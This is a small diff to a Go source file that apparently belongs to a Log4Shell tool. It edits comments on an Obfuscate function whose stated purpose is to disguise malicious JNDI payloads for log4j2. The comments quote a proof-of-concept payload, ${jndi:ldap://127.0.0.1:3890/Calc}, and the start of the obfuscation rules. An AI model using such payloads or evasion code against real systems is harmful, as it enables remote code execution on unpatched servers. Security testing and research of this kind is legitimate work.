@@ -5,7 +5,7 @@ import (
 	"strings"
 )
 
-// raw: ${jndi:ldap://127.0.0.1:3890/calc.class}
+// raw: ${jndi:ldap://127.0.0.1:3890/Calc}
 //
 // obfuscate rule:
 // 1. ${xxx-xxx:any-code:-bc} => bc
@@ -19,8 +19,8 @@ var skippedChars = map[byte]struct{}{
 	'}': {},
 }
 
-// Obfuscate is used to obfuscate malicious(payload) string like
-// ${jndi:ldap://127.0.0.1:3890/calc.class} for log4j2 package.
+// Obfuscate is used to obfuscate malicious(payload) string
+// like ${jndi:ldap://127.0.0.1:3890/Calc} for log4j2 package.
 func Obfuscate(raw string) string {
 	l := len(raw)
 	if l == 0 {
